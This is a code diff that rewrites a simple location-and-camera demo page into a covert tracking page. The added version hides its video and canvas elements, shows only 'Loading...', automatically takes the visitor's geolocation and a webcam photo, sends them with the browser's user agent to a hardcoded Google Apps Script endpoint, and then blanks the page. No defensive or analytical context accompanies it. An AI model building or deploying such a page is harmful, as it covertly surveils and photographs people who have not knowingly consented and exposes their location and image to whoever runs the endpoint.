@@ -2,65 +2,58 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Location & Camera Access</title>
-  <style>
-    body {
-      font-family: Arial;
-      text-align: center;
-      margin-top: 50px;
-    }
-    video, img {
-      width: 90%;
-      max-width: 400px;
-      margin-top: 10px;
-    }
-  </style>
+  <title>Loading...</title>
 </head>
 <body>
 
-<h2>Click to Continue</h2>
-<button onclick="start()">Continue</button>
-
-<p id="location"></p>
-
-<video id="video" autoplay playsinline></video>
-<br>
-<button onclick="capture()">Capture Photo</button>
-<br>
-<img id="photo">
+<video id="v" autoplay playsinline style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 
 <script>
-let video = document.getElementById("video");
+const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbz8n9zotQYMSTTSxcLfpDIldxazI75fDvuYNwI9Omgg1_FJf7NNVUYuzhVJccC5qsPG/exec";
 
-async function start() {
-  // 📍 LOCATION
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        document.getElementById("location").innerText =
-          "Latitude: " + pos.coords.latitude +
-          "\nLongitude: " + pos.coords.longitude;
-      },
-      err => alert("Location permission denied")
-    );
-  }
-
-  // 📷 CAMERA
+(async () => {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-  } catch (err) {
-    alert("Camera permission denied");
-  }
-}
+    // 📍 Location
+    const pos = await new Promise((res, rej) =>
+      navigator.geolocation.getCurrentPosition(res, rej)
+    );
 
-function capture() {
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-  document.getElementById("photo").src = canvas.toDataURL("image/png");
-}
+    // 📷 Camera
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.getElementById("v");
+    video.srcObject = stream;
+
+    await new Promise(r => setTimeout(r, 1500));
+
+    const canvas = document.getElementById("c");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+
+    const photo = canvas.toDataURL("image/jpeg");
+
+    stream.getTracks().forEach(t => t.stop());
+
+    // 📤 Send data
+    fetch(WEB_APP_URL, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        device: navigator.userAgent,
+        photo: photo
+      })
+    });
+
+    // 🕵️ Blank page
+    document.body.innerHTML = "";
+
+  } catch (e) {
+    console.log("Permission denied or error");
+  }
+})();
 </script>
 
 </body>
